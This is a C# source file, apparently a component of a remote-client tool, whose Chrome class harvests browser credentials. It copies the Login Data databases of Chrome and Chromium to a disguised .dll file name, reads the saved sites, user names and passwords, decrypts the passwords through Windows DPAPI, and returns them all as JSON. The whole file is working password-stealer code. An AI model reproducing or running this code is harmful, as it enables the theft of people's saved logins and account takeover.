using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace ClIENT_PC
{
    class Chrome
    {
        public static List<string> ListeDonneChemin = new List<string>
        {
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data",
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Chromium\User Data\Default\Login Data",
        };
        public string GetChrome()
        {
            List<object> ListeIdentifiant = new List<object> { };
            for (int i = 0; i < ListeDonneChemin.Count; i++)
			{
                if (File.Exists(ListeDonneChemin[i]))
                {
                    try
                    {
                        string destchemin = Application.StartupPath + @"\libqd" + i + ".dll";
                        if (File.Exists(destchemin))
                            File.Delete(destchemin); 

                        File.Copy(ListeDonneChemin[i], destchemin);
                        SQLiteConnection conn = new SQLiteConnection("DataSource=" + destchemin);
                        SQLiteCommand cmd = new SQLiteCommand("SELECT origin_url,username_value,password_value FROM logins;", conn); ;
                        conn.Open();

                        SQLiteDataAdapter da = new SQLiteDataAdapter(cmd);
                        SQLiteDataReader dt = cmd.ExecuteReader();

                        if (File.Exists(ListeDonneChemin[i]))
                        {
                            string host = string.Empty;
                            string user = string.Empty;
                            string pass = string.Empty;

                            while (dt.Read())
                            {
                                host = dt.GetString(0);
                                user = dt.GetString(1);
                                pass = Decrypt((byte[])dt.GetValue(2));

                                if (host != string.Empty && user != string.Empty)
                                {
                                    ListeIdentifiant.Add(new { name = "Chrome", host = host, login = user, password = pass });
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        //throw new ArgumentException(ex.ToString());
                    }
                }
			}
            var serializer = new JavaScriptSerializer();
            return serializer.Serialize(new { logins = ListeIdentifiant });
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [DllImport("Crypt32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool CryptUnprotectData(
            ref DATA_BLOB dataIn,
            StringBuilder ppszDataDescr,
            IntPtr optionalEntropy,
            IntPtr pvReserved,
            IntPtr pPromptStruct,
            int dwFlags,
            out DATA_BLOB pDataOut);

        [return: MarshalAs(UnmanagedType.Bool)]
        public static string Decrypt(byte[] Datas)
        {
            DATA_BLOB inj = default(DATA_BLOB); ;
            DATA_BLOB Ors = default(DATA_BLOB);
            GCHandle Ghandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
            inj.pbData = Ghandle.AddrOfPinnedObject();
            inj.cbData = Datas.Length;
            Ghandle.Free();
            CryptUnprotectData(
                ref inj,
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                out Ors);

            byte[] Returned = new byte[Ors.cbData + 1];
            Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData);
            string TheString = Encoding.Default.GetString(Returned);
            return TheString.Substring(0, (TheString.Length - 1));

            /* Pour decrypter aussi
             * try
            {
                return Encoding.ASCII.GetString(ProtectedData.Unprotect(data, null, DataProtectionScope.CurrentUser));
            }
            catch (CryptographicException e)
            {
                Console.WriteLine("Data was not decrypted. An error occurred.");
                Console.WriteLine(e.ToString());
                return null;
            }
             */
        }
    }
}
